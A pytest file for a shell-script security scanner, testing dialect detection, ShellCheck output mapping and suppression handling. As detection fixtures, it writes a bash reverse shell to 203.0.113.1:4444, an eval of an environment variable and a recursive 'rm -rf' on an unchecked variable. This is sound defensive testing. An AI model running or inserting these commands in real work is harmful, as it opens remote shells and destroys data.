import json
import shutil
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

from skills_verified.analyzers.llm_analyzer import LlmAnalyzer
from skills_verified.analyzers.pattern_analyzer import PatternAnalyzer
from skills_verified.analyzers.reverse_shell_analyzer import ReverseShellAnalyzer
from skills_verified.analyzers.shell_utils import shell_dialect
from skills_verified.analyzers.shellcheck_analyzer import ShellCheckAnalyzer
from skills_verified.core.models import Severity
from skills_verified.core.pipeline import Pipeline


@pytest.mark.parametrize(
    ("name", "first_line", "expected"),
    [
        ("check.sh", "#!/bin/sh", "sh"),
        ("check.sh", "#!/usr/bin/env bash", "bash"),
        ("check.bash", "", "bash"),
        ("check.sh", "", "sh"),
        ("check", "#!/usr/bin/env -S bash -eu", "bash"),
        ("check", "#!/bin/dash", "sh"),
        ("check", "#!/bin/zsh", None),
        ("check.py", "#!/usr/bin/python", None),
    ],
)
def test_shell_dialect_detection(name, first_line, expected):
    assert shell_dialect(Path(name), first_line) == expected


def test_shellcheck_uses_neutral_config_and_maps_json(monkeypatch, tmp_path):
    skill = tmp_path / "skills" / "demo"
    skill.mkdir(parents=True)
    target = skill / "check.sh"
    target.write_text(
        '#!/bin/sh\n# shellcheck disable=SC2115\nrm -rf "$TARGET/"*\n',
        encoding="utf-8",
    )
    outside = tmp_path / "outside.sh"
    outside.write_text("#!/bin/sh\necho outside\n", encoding="utf-8")
    context = SimpleNamespace(
        files=[target, outside],
        skill_roots=[Path("skills/demo")],
    )
    observed = {}

    monkeypatch.setattr(shutil, "which", lambda command: f"/usr/bin/{command}")

    def run(command, **kwargs):
        if "--version" in command:
            return subprocess.CompletedProcess(
                command,
                0,
                "ShellCheck - shell script analysis tool\nversion: 0.11.0\n",
                "",
            )
        observed["command"] = command
        observed["cwd"] = kwargs["cwd"]
        observed["env"] = kwargs["env"]
        scanned = Path(command[-1])
        observed["content"] = scanned.read_text(encoding="utf-8")
        return subprocess.CompletedProcess(
            command,
            1,
            json.dumps(
                {
                    "comments": [
                        {
                            "file": str(scanned),
                            "line": 3,
                            "endLine": 3,
                            "column": 1,
                            "endColumn": 8,
                            "level": "warning",
                            "code": 2115,
                            "message": "Use ${var:?} to ensure this never expands to /.",
                            "fix": None,
                        }
                    ]
                }
            ),
            "",
        )

    monkeypatch.setattr(subprocess, "run", run)
    monkeypatch.setenv("SHELLCHECK_OPTS", "--exclude=SC2115")

    analyzer = ShellCheckAnalyzer()
    findings = analyzer.analyze(tmp_path, context=context)

    assert len(findings) == 1
    finding = findings[0]
    assert finding.file_path == "skills/demo/check.sh"
    assert finding.line_number == 3
    assert finding.end_line == 3
    assert finding.rule_id == "SV-SHELLCHECK-SC2115"
    assert finding.severity == Severity.LOW
    assert finding.references == ["https://www.shellcheck.net/wiki/SC2115"]
    assert analyzer.version == "0.11.0"
    assert "--format=json1" in observed["command"]
    assert "--norc" in observed["command"]
    assert "--severity=style" in observed["command"]
    assert "-x" not in observed["command"]
    assert "SHELLCHECK_OPTS" not in observed["env"]
    assert Path(observed["cwd"]) != tmp_path
    assert "disable=SC2115" not in observed["content"]
    assert observed["content"].count("\n") == 3
    assert any(
        diagnostic.code == "shellcheck_suppressions_ignored"
        and diagnostic.details["count"] == 1
        for diagnostic in analyzer.diagnostics
    )


def test_shellcheck_maps_error_allows_security_info_and_ignores_other_info(tmp_path):
    mirror = tmp_path / "mirror"
    mirror.mkdir()
    target = mirror / "check.bash"
    target.write_text("#!/bin/bash\necho $value\n", encoding="utf-8")
    output = json.dumps(
        {
            "comments": [
                {
                    "file": str(target),
                    "line": 1,
                    "endLine": 1,
                    "level": "error",
                    "code": 1009,
                    "message": "The mentioned syntax error was in this file.",
                },
                {
                    "file": str(target),
                    "line": 2,
                    "endLine": 2,
                    "level": "info",
                    "code": 2086,
                    "message": "Double quote to prevent globbing and word splitting.",
                },
                {
                    "file": str(target),
                    "line": 2,
                    "endLine": 2,
                    "level": "info",
                    "code": 2035,
                    "message": "Use ./*glob* so names with dashes won't become options.",
                },
                {
                    "file": str(target),
                    "line": 2,
                    "endLine": 2,
                    "level": "warning",
                    "code": 2034,
                    "message": "value appears unused.",
                },
            ]
        }
    )

    findings = ShellCheckAnalyzer()._parse_output(output, mirror)

    assert len(findings) == 2
    assert findings[0].severity == Severity.MEDIUM
    assert findings[0].rule_id == "SV-SHELLCHECK-SC1009"
    assert findings[1].severity == Severity.LOW
    assert findings[1].rule_id == "SV-SHELLCHECK-SC2035"


def test_shellcheck_exit_two_keeps_findings_and_marks_run_partial(
    monkeypatch, tmp_path
):
    target = tmp_path / "check.sh"
    target.write_text("#!/bin/sh\necho ok\n", encoding="utf-8")
    monkeypatch.setattr(shutil, "which", lambda command: f"/usr/bin/{command}")

    def run(command, **kwargs):
        if "--version" in command:
            return subprocess.CompletedProcess(command, 0, "version: 0.11.0\n", "")
        scanned = Path(command[-1])
        return subprocess.CompletedProcess(
            command,
            2,
            json.dumps(
                {
                    "comments": [
                        {
                            "file": str(scanned),
                            "line": 1,
                            "endLine": 1,
                            "level": "warning",
                            "code": 2115,
                            "message": "partial result",
                        }
                    ]
                }
            ),
            "could not process one file",
        )

    monkeypatch.setattr(subprocess, "run", run)

    report = Pipeline([ShellCheckAnalyzer()]).run(tmp_path, repo_url="test://shell")

    assert report.analyzer_runs[0].status.value == "partial"
    assert report.findings[0].rule_id == "SV-SHELLCHECK-SC2115"
    assert any(
        diagnostic.code == "shellcheck_incomplete" for diagnostic in report.diagnostics
    )


def test_shellcheck_missing_executable_is_unavailable(monkeypatch):
    monkeypatch.setattr(shutil, "which", lambda _command: None)
    monkeypatch.setattr(
        "skills_verified.analyzers.shellcheck_analyzer.sys.executable",
        "/missing/python",
    )
    assert ShellCheckAnalyzer().is_available() is False


def test_existing_analyzers_cover_bash_and_extensionless_shell(tmp_path):
    extensionless = tmp_path / "run"
    extensionless.write_text('#!/bin/sh\neval "$COMMAND"\n', encoding="utf-8")
    bash_script = tmp_path / "connect.bash"
    bash_script.write_text(
        "#!/usr/bin/env bash\nbash -i >& /dev/tcp/203.0.113.1/4444 0>&1\n",
        encoding="utf-8",
    )

    pattern_findings = PatternAnalyzer().analyze(tmp_path)
    reverse_findings = ReverseShellAnalyzer().analyze(tmp_path)
    llm_files = LlmAnalyzer(config=None)._collect_files(tmp_path)

    assert any(finding.rule_id == "SV-CODE-SHELL-EVAL" for finding in pattern_findings)
    assert any(finding.file_path == "connect.bash" for finding in reverse_findings)
    assert set(llm_files) == {"connect.bash", "run"}


@pytest.mark.skipif(
    not ShellCheckAnalyzer().is_available(), reason="shellcheck not installed"
)
def test_real_shellcheck_accepts_safe_script(tmp_path):
    target = tmp_path / "review"
    target.write_text(
        "#!/bin/sh\nset -eu\nprintf '%s\\n' \"${1:-ok}\"\n",
        encoding="utf-8",
    )

    assert ShellCheckAnalyzer().analyze(tmp_path) == []


@pytest.mark.skipif(
    not ShellCheckAnalyzer().is_available(), reason="shellcheck not installed"
)
def test_real_shellcheck_detects_ignored_catastrophic_rm(tmp_path):
    target = tmp_path / "cleanup.sh"
    target.write_text(
        '#!/bin/sh\n# shellcheck disable=SC2115\nrm -rf "$TARGET/"*\n',
        encoding="utf-8",
    )

    findings = ShellCheckAnalyzer().analyze(tmp_path)

    assert any(finding.rule_id == "SV-SHELLCHECK-SC2115" for finding in findings)
